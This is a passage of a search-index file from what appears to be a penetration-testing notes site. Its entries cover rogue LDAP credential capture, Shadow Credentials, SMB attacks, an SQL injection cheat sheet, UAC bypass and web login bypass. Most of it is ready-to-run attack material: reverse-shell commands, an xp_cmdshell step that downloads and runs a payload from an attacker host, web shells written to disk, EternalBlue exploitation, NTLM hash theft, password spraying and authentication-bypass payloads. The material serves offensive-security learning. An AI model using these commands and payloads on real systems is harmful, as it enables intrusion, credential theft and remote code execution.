server.\nInstall the dependencies at first.\nsudo apt update sudo apt install -y slapd ldap-utils sudo systemctl enable slapd Configure your own rogue LDAP server by executing the following command.\nsudo dpkg-reconfigure -p low slapd # --------------------------------------------------- # in configuration dialog 1. Omit OpenLDAP server configuration: No 2. DNS domain name: 3. Organization name: 4. Administrator password: 5. Database backend to use: MDB 6. Do you want the database to be removed when slapd is purged?: No 7. Move old database?: Yes We need to make your rogue LDAP server to be vulnerable by downgrading the supported authentication mechanism.\nCreate the config file named config.ldif.\ndn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred Now we can use the config file to patch the LDAP server.\n# -Y: SASL mechanism # -H: URI sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./config.ldif sudo service slapd restart We can verify that the rogue LDAP servers configuration has been applied:\nldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms For capturing the credentials, run the following command.\nsudo tcpdump -SX -i tcp port 389 In browser, test the printer settings and capture the credentials via tcpdump.\n"
            }
        );
    index.add(
            {
                id:  54 ,
                href: "\/docs\/hdks\/windows\/active-directory\/shadow-credentials\/",
                title: "Shadow Credentials",
                description: "Shadow Credentials is an attack technique to take over Active Directory user/computer account by compromising msDS-KeyCredentialLink property of target objects.",
                content: "Exploit linkIf the attacker can modify the target objects (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates, he takes over the account in AD.\nUsing Certipy link # -k: Use Kerberos authentication certipy shadow auto -account \"targetuser\" -u \"username@example.local\" -p 'password' -dc-ip 10.0.0.1 -target dc.example.local -k Using Whisker linkWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.\nWhisker.exe add /target:john /domain:example.local "
            }
        );
    index.add(
            {
                id:  55 ,
                href: "\/docs\/hdks\/windows\/active-directory\/smb-pentesting\/",
                title: "SMB (Server Message Block) Pentesting",
                description: "It allows clients, like workstations, to communicate with a server like a share directory. Samba is derived from SMB for linux. Default ports are 139, 445.",
                content: "Enumeration linkTo enumerate automatically, we can use various tools such as nmap, smbclient, and so on\nnmap --script smb-brute -p 445 nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 nmap --script smb-enum* -p 445 nmap --script smb-protocols -p 445 nmap --script smb-vuln* -p 445 # NetBIOS names nmblookup -A 10.0.0.1 nbtscan 10.0.0.1 # Enum4linux enum4linux # All enumeration enum4linux -a # Verbose enum4linux -v # Specify username and password enum4linux -u username -p password # Enum4linux-ng # -A: All simple enumeration including nmblookup enum4linux-ng -A # -As: All simple short enumeration without NetBIOS names lookup enum4linux-ng -As # -u: Specific username # -p: Specific password enum4linux-ng -u \"administrator\" -p \"password\" # NetExec (https://www.netexec.wiki/) netexec smb 10.0.0.0/24 netexec smb netexec smb netexec smb -u username -p password netexec smb -u username -p password --users # -M zerologon: Scan for ZeroLogon # -M petitpotam: Scan for PetitPotam netexec smb -u '' -p '' -M zerologon -M petitpotam # -M petitpotam: Scan for PetitPotam Find Shared Folders link # -N: No password # -L: List shared directories smbclient -N -L smbclient -L -U username smbmap -H # Recursive smbmap -H -R # Username and password smbmap -u username -p password -H # Execute a command smbmap -u username -p password -H -x 'ipconfig' netexec smb -u '' -p '' --shares netexec smb -u username -p password --shares # -M: Specify module crackmapexec smb -u username -p password -M spider_plus cat /tmp/cme_spider_plus/.json impacket-psexec example.local/username@ Brute Force Credentials link netexec smb -u usernames.txt -p passwords.txt netexec smb -u usernames.txt -H ntlm_hashes.txt crackmapexec smb -u username -p passwords.txt crackmapexec smb -u username -H ntlm-hashes.txt hydra -l username -P passwords.txt smb hydra -L usernames.txt -p password smb # RID Brute Force netexec smb -u username -p password --rid-brute 20000 crackmapexec smb -u \"anonymous\" -p \"\" --rid-brute 20000 # Using Metasploit msfconsole msf\u003e use auxiliary/scanner/smb/smb_login If we find credentials, we can use them for smbclient or WinRM.\nIf we got STATUS_PASSWORD_MUST_CHANGE for some users, we can update a current password to a new one.\nsmbpasswd -r -U # or impacket-smbpasswd /:@ -newpass # If you don't have impacket-smbpasswd, download it from a repository. wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py RID Cycling Attack linkRID enumeration.\nIt attempts to enumerate user accounts through null sessions.\n# Anonymous logon # 20000: Maximum RID to be cycled impacket-lookupsid example.local/anonymous@ 20000 -no-pass impacket-lookupsid example.local/guest@ 20000 -no-pass impacket-lookupsid example.local/guest@ 20000 # Specify user impacket-lookupsid example.local/user@ 20000 -hashes : impacket-lookupsid example.local/user@ 20000 Password Spraying Attack linkIf we have a user password, we might be able to find another user with the same password.\nnetexec smb -u usernames.txt -p passwords.txt --no-bruteforce netexec smb -u usernames.txt -H ntlm_hashes.txt --no-bruteforce # --continue-on-success: Continue after found netexec smb -u usernames.txt -p passwords.txt --no-bruteforce # Find aother user crackmapexec smb -u username -p password --users # Another users with the same password crackmapexec smb -u users.txt -p password --continue-on-success # -d: Spacify the domain crackmapexec smb -u users.txt -p password -d example.local --continue-on-success # Using hashes instead of a password crackmapexec smb -u -H hashes.txt Connect linkYou can use smbclient to connect the target.\n# anonymous login smbclient //10.0.0.1/somedir -N # If the folder name contains spaces, surround with double quotes smbclient \"//10.0.0.1/some dir\" -N # Specify user smbclient //10.0.0.1/somedir -U username # nobody, no-pass smbclient //10.0.0.1/somedir -N -U nobody # Specify workgroup smbclient -L 10.0.0.1 -W WORKGROUP -U username To get a Windows shell, run the following examples.\nimpacket-wmiexec example.local/username@10.0.0.1 # Pass the Hash impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 Commands in SMB linkAfter connecting, we can investigate the shared folder to find sensitive files or information.\nList Folders/Files link smb\u003e ls Download Folders/Files link smb\u003e get sample.txt # If the filename contains spaces, it need to be enclosed in double-quotes. smb\u003e get \"Example File.txt\" To download files recursively, run the following commands.\nsmb\u003e mask \"\" smb\u003e recurse ON smb\u003e prompt OFF smb\u003e mget * Or using smbget from local machine.\nEspecially, its useful for downloading a large file rather than get command in smbclient.\nsmbget smb:///somedir/example.txt -U username smbget -R smb:///somedir -U username # Specify workgroup smbget -R smb:///somedir -w WORKGROUP -U username # as anonymous user smbget smb:///somedir -U anonymous password: anonymous Upload Files link # Upload a file smb\u003e put example.txt Upload Reverse Shell Payload If the website is associated with the SMB server, we can upload reverse shell script such as aspx, php and get a shell.\nTo create a payload, please refer to the Web Reverse Shell or the Reverse Shell with Metasploit.\nThen upload it to the SMB server as below.\nsmb\u003e put shell.aspx Dont forget to start a listener for getting outcoming connection.\nnc -lvnp 4444 Now access to https://example.com/path/to/smb/share/shell.aspx.\nWe can get a shell.\nSteal NTLM Hash with Desktop.ini linkReference: https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini\nWe can retrieve the hashes by putting desktop.ini file, that contains arbitrary icon resource path, to the shared folder.\nCreate a new desktop.ini in local machine.\n[.ShellClassInfo] IconResource=\\\\\\test Then upload it to the writable shared folder.\nsmb\u003e put desktop.ini Start responder in local machine.\nresponder -I tun0 After a while, we can retrieve the NTLM hashes.\nEternalBlue (MS17-010) link msfconsole msf\u003e use exploit/windows/smb/ms17_010_eternalblue msf\u003e set rhosts msf\u003e set lhost msf\u003e run # If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload msf\u003e set payload payload/generic/shell_reverse_tcp AutoBlue linkAutoBlue is an automatic exploit.\nDownload the repository and run the following example command.\npython zzz_exploit.py -target-ip -port 445 'username:password@target' Manual Exploiting linkYou need to have two files - exploit.py, mysmb.py\nDownload mysmb.py\nwget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py # Convert DOS to UNIX dos2unix mysmb.py Edit Some Lines of mysmb.py for Python3\nYou need to edit some code because this exploit is old so only supports Python2.\nLine.69 # transData = b'' transData = '' Line.73 # transData = ('\\x00' * padLen) + str(parameters) transData = \"\".join(map(chr,(b'\\x00' * padLen))) + str(parameters) Line.80 # transData += ('\\x00' * padLen) + data transData += \"\".join(map(chr,(b'\\x00' * padLen))) + str(data) Line.231 # req = str(pkt) req = pkt.getData() return b'\\x00'*2 + pack('\u003eH', len(req)) + req # assume length is \u003c6553 Line.381 # data += resp['Data'][1:] data += resp['Data'][1:].decode() Download exploit.py\nwget -O exploit.py https://www.exploit-db.com/exploits/42315 # Convert DOS to UNIX dos2unix exploit.py Edit the Credentials in exploit.py\n... username = \"username\" password = \"password\" ... Run the script\npython exploit.py netlogon python exploit.py lsarpc python exploit.py samr Launch SMB Server link impacket-smbserver share . -smb2support -username user -password pass Access from Remote Machine link net use \\\\\\share /u:user pass Transfer Files link # Remote to Local cp .\\example.txt \\\\\\share\\example.txt "
            }
        );
    index.add(
            {
                id:  56 ,
                href: "\/docs\/hdks\/web\/security-risk\/sql-injection-cheat-sheet\/",
                title: "SQL Injection Cheat Sheet",
                description: "SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. This page is about the SQL injection cheat sheet.",
                content: "Comment Syntax linkComment syntax is depending on the database used in the website.\nMSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.\n' OR 1=1-- ' OR 1=1-- - ' OR 1=1# ' OR '1'='1'-- ' OR '1'='1'-- - ' OR '1'='1'# ' OR '1'='1-- ' OR '1'='1-- - ' OR '1'='1# \" OR 1=1-- \" OR 1=1-- - \" OR 1=1# ') OR 1=1-- ') OR 1=1-- - ') OR 1=1# '; OR 1=1-- '; OR 1=1-- - '; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF\nIf website filters to prevent our payloads, we need to bypass the filter.\nHTTP Parameter Pollution linkWe may inject by splitting the parameter values on the same keys.\n/?id='+select+1\u0026id=2,3+from+users+where+id=1-- - New Line (%0A) linkBy prepending the new line (URL encoded to %0A), subsequent syntax may circumvent the filtering.\n/?id=%0A' OR 1=1-- - Version Detection linkMSSQL link ' UNION SELECT @@version-- ' UNION SELECT NULL,@@version-- MySQL link ' UNION SELECT @@version-- - ' UNION SELECT @@version# ' UNION SELECT NULL,@@version-- - ' UNION SELECT NULL,@@version# Oracle link ' UNION SELECT 'a' FROM dual-- ' UNION SELECT 'a','b' FROM dual-- ' UNION SELECT * FROM v$version-- ' UNION SELECT BANNER,NULL FROM v$version-- PostgreSQL link ' UNION SELECT version()-- ' UNION SELECT NULL,version()-- SQLite link ' UNION SELECT sqlite_version()-- ' UNION SELECT sqlite_version(),NULL-- Detect Number of Columns linkThe following commands detect the number of the columns in the database.\n' UNION SELECT NULL-- ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- - ' UNION SELECT 'a',NULL,NULL-- ' UNION SELECT 'a',NULL,NULL-- - ' UNION SELECT NULL,'a',NULL-- ' UNION SELECT NULL,'a',NULL-- - ' UNION SELECT NULL,NULL,'a'-- ' UNION SELECT NULL,NULL,'a'-- - UNION ALL linkWe can combine the result of the query into the one column by using UNION ALL syntax.\n' UNION ALL SELECT \"' UNION SELECT flag,NULL,NULL from flags-- -\",NULL,NULL from users-- - List Table Names linkGet the table name in which you want to get the information.\nMSSQL link ' UNION SELECT table_name,NULL FROM information_schema.tables-- MySQL link ' UNION SELECT table_name,NULL FROM information_schema.tables-- - ' UNION SELECT table_name,NULL FROM information_schema.tables# ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables-- - ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables# PostgreSQL link ' UNION SELECT table_name,NULL FROM information_schema.tables-- Oracle link ' UNION SELECT table_name,NULL FROM all_tables-- SQLite link ' UNION SELECT tbl_name FROM sqlite_master-- ' UNION SELECT tbl_name,NULL FROM sqlite_master-- List Column Names linkGet column names from the table name which we got.\nMSSQL link ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- MySQL link ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- - ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'# PostgreSQL link ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- Oracle link ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'-- SQLite link ' UNION SELECT column List Information in the Table linkGet information in the table.\nFor instance, suppose we want to get the username and password from the table named users.\n' UNION SELECT username,password FROM users-- ' UNION SELECT username,password FROM users-- - ' UNION SELECT username || '~' || password FROM users-- ' UNION SELECT username || '~' || password FROM users-- - ' UNION SELECT NULL,username || '~' || password FROM users-- ' UNION SELECT NULL,username || '~' || password FROM users-- - ' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'-- ' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'-- - ' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'-- ' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'-- - ' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'-- ' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'-- - BINARY: Sensitive to upper case and lower case.\n' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'-- ' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'-- - Dumping Table link ' UNION SELECT table_name FROM table_name-- ' UNION SELECT table_name,NULL FROM table_name-- Fetch All Entities link ' UNION SELECT * FROM users-- - '; SELECT * FROM users-- - Modify/Insert Data linkInsert Arbitrary Data link ' INSERT INTO users (username, password) VALUES ('admin', 'pass')-- - '; INSERT INTO users (username, password) VALUES ('admin', 'pass')-- - ' INSERT INTO products (id, name, price) VALUES (999, \"\u003c?php system('id'); ?\u003e\", 10)-- - Update Arbitrary Data link ' UPDATE users SET password='password123' WHERE username='admin'-- - ' UPDATE users SET password='password123' WHERE id=1-- - Upsert linkThis is a combination of UPDATE and INSERT operation. If a particular row already exists, it will be updated with new values. Here are examples that update password for the existing admin user.\nINSERT INTO users (username, password) VALUES('admin', '') ON DUPLICATE KEY UPDATE password=''-- - INSERT INTO users (username, password) VALUES ('admin', '') ON CONFLICT (username) DO UPDATE SET password='password'-- RCE linkMSSQL link In attack machine, prepare a payload for reverse shell. Replace the ip address of LHOST with your ip.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe In attack machine, start a local web server to host the payload file. python3 -m http.server 8000 In attack machine, start a listener to receiver incoming connection. nc -lvnp 4444 In target website, execute the shell command with SQLi. ' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- ' ; EXEC xp_cmdshell 'certutil -urlcache -f http://10.0.0.1:8000/shell.exe C:\\Windows\\Temp\\shell.exe';-- ' ; EXEC xp_cmdshell 'C:\\Windows\\Temp\\shell.exe';-- After execution, we may get a shell of target system.\nError-based SQLi linkReference: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based\nWe might be able to gather information of the database by leading the error message. We can construct SQLi while checking error messages.\nHere are MySQL injection examples.\n' AND 1=CAST((SELECT 1) AS int)-- - ' AND 1=CAST((SELECT password FROM users) AS int)-- - ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) In the example above, we may see the password revealed in the error message.\nBlind SQL link1. Check if the SQL Injection Works link ' AND '1'='1 ' AND '1'='2 ' AND (SELECT 'a' FROM users LIMIT 1)='a 2. Check if Content Value Exists linkFor example, check if username administrator exists in users\n' AND (SELECT 'a' FROM users WHERE username='administrator')='a If so, determine the password length\n' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)\u003e1)='a ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)\u003e2)='a ... ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a Brute force passwords character\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$ ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$ ... ' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$ Blind SQL (Time-based) link1. First Check link MySQL\n' AND sleep(5)-- - PostgreSQL\n'||pg_sleep(10)-- '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- '; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 2. Check if Content Value Exists link '; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- If so, determine the password length\n'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)\u003e1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)\u003e2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- ... '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- Brute force password character\n'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- ... '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- Conditional Error link1. First Check link ' '' '||(SELECT '')||' '||(SELECT '' FROM dual)||' '||(SELECT '' FROM fake_table)||' '||(SELECT '' FROM users WHERE ROWNUM = 1||' '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' '|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' 2. Check if Content Value Exists link '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' If so, determine the password length\n''||(SELECT CASE WHEN LENGTH(password)\u003e2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ''||(SELECT CASE WHEN LENGTH(password)\u003e3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ... ''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Brute force password character\n'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' '||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ... '||(SELECT CASE WHEN SUBSTR(password,8,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Writing Files linkWe can write arbitary code to a file as below.\n' SELECT '\u003c?php echo system(\"id\");?\u003e' INTO OUTFILE '/var/www/html/shell.php'-- - HEX Encoded Payloads link ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E-- - ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E# 0x3C3F is a hex encoded text meaning \"\u003c?php system($_GET[cmd]) ?\u003e\". After injectin, we can access to http://10.0.0.1/shell.php?cmd=whoami.\nXML Filter Bypass linkReference: https://portswigger.net/web-security/sql-injection\n1 \u0026#x53;ELECT * FROM information_schema.tables If you use Burp Suite, its recommended to use the Hackvertor extention to obfuscate payloads.\nFor example, in Repeater, highlight the string which you want to encode. Then right-click and select Extensions  Hackvertor  Encode  hex_entities.\nAfter that, our payload is as below.\n\u003c@hex_entities\u003e 1 UNION SELECT * FROM information_schema.tables \u003c@/hex_entities\u003e XPATH Injection linkMySQL link ' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,1,16) FROM users)),null)-- - If the error result appears such like the following, we retrieved the piece of the password hash.\nXPATH syntax error: ':3ac6b24dc611a692' So we can find the remaining of the password hash by injecting below command.\n' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,17,32) FROM users)),null)-- - Truncation Attack linkWe can add another user which is the same name as the existing user by registering the same name user with enough spaces to truncate a username.\nFirst off, check the table schema if can.\nCREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); Now send POST request with a payload to create a new admin.\n# POST request POST /create-user HTTP/1.1 # Create another new \"admin\" with more than 64 characters. Btw, \"+\" means the spaces. username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random\u0026password=password Then check if we can login with a new admin.\nusername=admin\u0026password=password Fetch the admins information with the original password.\nSELECT * FROM users WHERE username='admin'; # It should return the values are the real admin's information. username = admin password = "
            }
        );
    index.add(
            {
                id:  57 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/uac-windows-privilege-escalation\/",
                title: "UAC Windows Privilege Escalation",
                description: "UAC (User Account Control) is an access control enforcement feature.",
                content: "Automation linkUACME is an automation tool for defeating Windows UAC.\nInvestigation link # Check the current user's integrity level whoami /groups | findstr \"Label\" whoami /groups | find \"Label\" UAC Bypass linkAZMAN.MSC (Authorization Manager) link Open AZMAN.MSC by entering azman.msc in the Run. Click Help and select Help Topics. The MMC window will open. In the MMC window, right-click and select View Source. The Notepad opens. In the Notepad, select File  Open. then click Open. Command Prompt will open. In Command Prompt, we should escalate to High integrity level. For instance, try cd C:\\Users\\Administrator command. We may be able to access this directory even if were not Administrator. In Explorer, select Windows/System32/cmd.exe and right-click, then select Open. We should escalate to High integrity level. Fodhelper (Features on Demand Helper) linkFodhelper manages the Windows features settings.\nFirst start listener in local machine for getting incoming connection.\nnc -lvnp 4444 In remote Windows machien, add subkey to the registry and execute fodhelper to reverse shell.\nset REG_KEY=HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command set CMD=\"powershell -windowstyle hidden C:\\socat.exe TCP::4444 EXEC:cmd.exe,pipes\" # /v: Value name under the selected key. # /d: Data to assign to the registry ValueName being added. # /f: Force overwriting the existing registry entry without prompt. reg add %REG_KEY% /v \"DelegateExecute\" /d \"\" /f reg add %REG_KEY% /d %CMD% /f \u0026 fodhelper.exe We should get a shell and elevate High integrity level.\nTo check the IL, run the following command.\nwhoami /groups | find \"Label\" Finally, we need to clear the above settings to avoid detection.\n# /f: Forces the deletion without prompt reg delete HKCU\\Software\\Classes\\ms-settings\\ /f Scheduled Task: Disk Cleanup linkStart listener for getting reverse connection in local machine.\nnc -lvnp 4444 Add the entry to registry to reverse shell.\nreg add \"HKCU\\Environment\" /v \"windir\" /d \"cmd.exe /c C:\\socat.exe TCP::4444 EXEC:cmd.exe,pipes \u0026REM \" /f # /run: Start the scheduled tasks immediately. # /tn: Task name # /I: Idle time schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I System Configuration (msconfig) link Open System Configuration by entering msconfig in the Run. Go to Tools tab and select Command Prompt, then click Launch. We should escalate to High integrity level. Abuse UAC Windows Certificate Dialog (CVE-2019-1388) linkUAC Windows Certificate Dialog is vulnerable to privilege escalation.\nOpen hhupd.exe. The User Account Control window opens.\nClick the Show more details and click also Show information about the publishers certificate.\nNow click the Issued by link. Web browser will open.\nIn web browser, select Tools -\u003e File -\u003e Save as.\nOn the explorer window address path, enter the cmd.exe full path as below:\nc:\\Windows\\System32\\cmd.exe\nNow we escalated the privilege.\n"
            }
        );
    index.add(
            {
                id:  58 ,
                href: "\/docs\/hdks\/web\/method\/web-login-bypass\/",
                title: "Web Login Bypass",
                description: "Common Default Credentials linkCheck if the website has not changed credential from the default username/password.\nadmin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link ' or '1'='1 ' or '1'='1-- or true-- ' or true-- UNION SELECT null-- ' UNION SELECT null-- ' UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link '-- ' or 1=1-- ' or '1'='1'-- }\" or 1=1-- MySQL link '-- - '# ' or 1=1# ' or 1=1-- - ' or '1'='1'-- - ' or '1'='1'# }\" or 1=1-- - NoSQL Injection linkReference: https://portswigger.",
                content: "Common Default Credentials linkCheck if the website has not changed credential from the default username/password.\nadmin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link ' or '1'='1 ' or '1'='1-- or true-- ' or true-- UNION SELECT null-- ' UNION SELECT null-- ' UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link '-- ' or 1=1-- ' or '1'='1'-- }\" or 1=1-- MySQL link '-- - '# ' or 1=1# ' or 1=1-- - ' or '1'='1'-- - ' or '1'='1'# }\" or 1=1-- - NoSQL Injection linkReference: https://portswigger.net/web-security/nosql-injection\nMongo link ' || 1==1// ' || 1==1%00 ' || '1==1 ' || '1'=='1 '||1||' admin' \u0026\u0026 this.password[0] == 'a' || 'a' == 'b admin' \u0026\u0026 this.password[1] == 'a' || 'a' == 'b admin' \u0026\u0026 this.password[2] == 'a' || 'a' == 'b admin'%26%26+this.password[0]=='a'||'a'=='b Operators\n# $ne: Not equal username[$ne]=xyz\u0026password[$ne]=xyz username[$ne]=xyz\u0026password=test # $regex: Regular expressions username[$regex]=.*\u0026password[$regex]=.* username[$regex]=^xyz\u0026password[$regex]=^xyz username[$regex]=^a.*$\u0026password[$ne]=xyz username[$regex]=.{6}\u0026password[$ne]=xyz username[$regex]=^.{1}\u0026password[$regex]=^.{1} # Length of values # $exists: Exists in the database username[$exists]=true\u0026password[$exists]=true # $in: Include in array username[$in]=[admin]\u0026password[$ne]=xyz # $nin: Not include username[$nin][admin]=admin\u0026password[$ne]=xyz # If we found the \"admin\" exists, we can exclude \"admin\" by specifying $nin operator. username[$nin][]=admin\u0026password[$ne]=xyz # If more users are found, we can exclude the user. username[$nin][]=admin\u0026username[$nin][]=john\u0026password[$ne]=xyz # $gt: Greater than username[$gt]=s\u0026password[$gt]=s # $lt: Lower than username[$lt]=s\u0026password[$lt]=s # Combinations username[$ne]=xyz\u0026password[$regex]=.* username[$exists]=true\u0026password[$ne]=xyz username[$ne]=xyz\u0026password[$exists]=true username[$regex]=.*\u0026password[$ne]=xyz username[$ne]=xyz\u0026password[$regex]=.* username[$regex]=.{6}\u0026password[$ne]=xyz After finding usernames, we can also obtain the passwords using the $regex operator as the following example.\n# Check if the password length is 7 characters. username=admin\u0026password[$regex]=^.{7}$ # If not, change 7 to 6 (or 8 or something number). username=admin\u0026password[$regex]=^.{6}$ # If the number of characters turns out to be 6, brute force the character one by one. username=admin\u0026password[$regex]=^a.....$ username=admin\u0026password[$regex]=^s.....$ username=admin\u0026password[$regex]=^se....$ username=admin\u0026password[$regex]=^sec...$ Operators in Json\nIf the above payloads not working, try changing to a json format.\nWe also need to change the value of the Content-Type to application/json in the HTTP header.\n# Not equal {\"username\": { \"$ne\": \"xyz\" }, \"password\": { \"$ne\": \"xyz\" }} # $in: Include in array {\"username\":{\"$in\":[\"admin\",\"administrator\",]},\"password\":{\"$ne\":\"\"}} SQL Injection with SQLmap linkAlternatively, we can automate SQLi using sqlmap.\n# 'req.txt' is a file which can be downloaded in Burp Suite by clicking `save item` on the request. sqlmap -r req.txt sqlmap -r req.txt --risk 2 --level 5 sqlmap -r req.txt --risk 3 --level 5 Please see SQL Injection with Sqlmap page for details.\nWildcard Brute Force linkIf it is allowed to login with wildcard (*), you may be able to find the username/password with brute force.\nusername = * password = * For example, in Turbo Intruder (Burp Suite), login attempt with alpha numeric characters one by one.\nusername=%s*\u0026password=* # or username=*\u0026password=%s* My favorite wordlist for it is the seclists:\nhttps://github.com/danielmiessler/SecLists/blob/master/Fuzzing/alphanum-case-extra.txt\nBrute Force Credentials linkBefore brute forcing, we need wordlists used for it.\nRockyou\nSecLists\nCeWL\nGenerate the custom wordlist from the target web page.\ncewl https://example.com -w wordlist.txt cewl https://example.com/about-us -w usernames.txt # -d: Depth # -m: Minimum word length cewl -d 2 -m 5 https://example.com -w wordlist.txt # --extentions cewl https://example.com -w wordlist.txt --lowercase cewl https://example.com -w wordlist.txt --with-numbers [crunch]\ncrunch -o wordlist.txt # e.g. crunch 3 5 0123456789ABCDEF -o wordlist.txt If we can predict the target password reasonably, we can generate passwords from the password.\necho -n 'passw0rd' \u003e password.txt hashcat --stdout password.txt -r /usr/share/hashcat/rules/best64.rule \u003e passlist.txt Using Ffuf link # -fc: Filter HTTP status code ffuf -w passwords -X POST -d \"username=admin\u0026password=FUZZ\" -u http://vulnerable.com/login -fc 401 # Basic Auth ffuf -u https://admin:FUZZ@example.com/ -w wordlist.txt -fc 401 Also we can use raw request file of Burp Suite.\nSend request in Burp Suite. Right-click on the request screen. Click Copy to file in the menu. Edit the raw file to change target value to FUZZ keyword. After that, we can use it in the ffuf command.\n# Interate with Burp Suite raw request ffuf -u http://example.com/login -request raw.txt -x http://127.0.0.1:8080 -w wordlist.txt Using Hydra link # Cracking username hydra -L usernames.txt -p password vulnerable.com http-post-form 